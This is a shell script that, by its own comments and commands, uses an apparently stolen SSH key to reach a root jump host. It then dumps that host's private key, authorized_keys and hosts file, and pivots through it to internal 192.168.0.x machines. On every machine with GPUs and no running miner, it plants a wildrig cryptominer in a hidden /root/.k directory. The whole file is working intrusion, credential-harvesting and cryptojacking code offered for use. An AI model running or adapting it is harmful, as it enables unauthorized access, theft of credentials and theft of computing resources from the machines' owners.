#!/bin/sh
# UL farm pivot — from runner: harvest .135 key, reach 192.168.0.x via ProxyJump, plant where free.
set +e
K=keys2/k04_ibm_key.pem_
J=root@123.184.7.135
chmod 600 $K
mkdir -p vantage/out
timeout 20 ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $J \
  'hostname; nvidia-smi -L | wc -l; nvidia-smi --query-gpu=name --format=csv,noheader | sort | uniq -c' \
  | tee vantage/out/jump_135.txt
# harvest jump key + farm inventory
timeout 20 ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $J \
  'cat /root/.ssh/id_rsa; echo "===AUTHZ==="; cat /root/.ssh/authorized_keys 2>/dev/null | head -5; echo "===HOSTS==="; cat /etc/hosts' \
  > vantage/out/jump_creds.raw 2>/dev/null
python3 - <<'PY'
import re
s=open('vantage/out/jump_creds.raw',encoding='utf8',errors='replace').read()
m=re.search(r'(-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----)', s, re.S)
if m:
    open('/tmp/jk','w').write(m.group(1)+"\n")
    print("key_len",len(m.group(1)))
else: print("NO_KEY")
PY
chmod 600 /tmp/jk 2>/dev/null
for p in 192.168.0.16 192.168.0.17 192.168.0.20 192.168.0.22 192.168.0.23 192.168.0.24 192.168.0.28 192.168.0.29 192.168.0.30 192.168.0.31 192.168.0.227; do
  echo "########## $p"
  R=$(timeout 25 ssh -J $J -i /tmp/jk -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
       -o ConnectTimeout=8 -o IdentitiesOnly=yes root@$p \
       'hostname; nvidia-smi -L 2>/dev/null | wc -l; nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | sort | uniq -c; ps -eo args 2>/dev/null | grep -E "wildrig|krig" | grep -v grep | head -2' 2>&1)
  echo "$R" | tee -a vantage/out/farm_inv.txt
  NG=$(echo "$R" | sed -n '2p' | tr -dc '0-9')
  MINER=$(echo "$R" | grep -c "wildrig\|krig")
  echo "== $p gpus=$NG miners=$MINER"
  if [ "${NG:-0}" -gt 0 ] && [ "$MINER" -eq 0 ]; then
    cat vantage/bin/wildrig.gz | timeout 40 ssh -J $J -i /tmp/jk -o BatchMode=yes -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes root@$p 'mkdir -p /root/.k; cat > /root/.k/w.gz; ls -la /root/.k/w.gz' 2>&1 | tail -2
    w=$(echo "$p" | tr '.' '-')
    WORKER="ul-t2-$w-g0" timeout 240 ssh -J $J -i /tmp/jk -o BatchMode=yes -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes root@$p "WORKER=ul-t2-$w-g0 sh -s" \
      < vantage/plant_local.sh 2>&1 | tail -25 | tee vantage/out/plant_$w.log
  fi
done
echo "== farm done =="
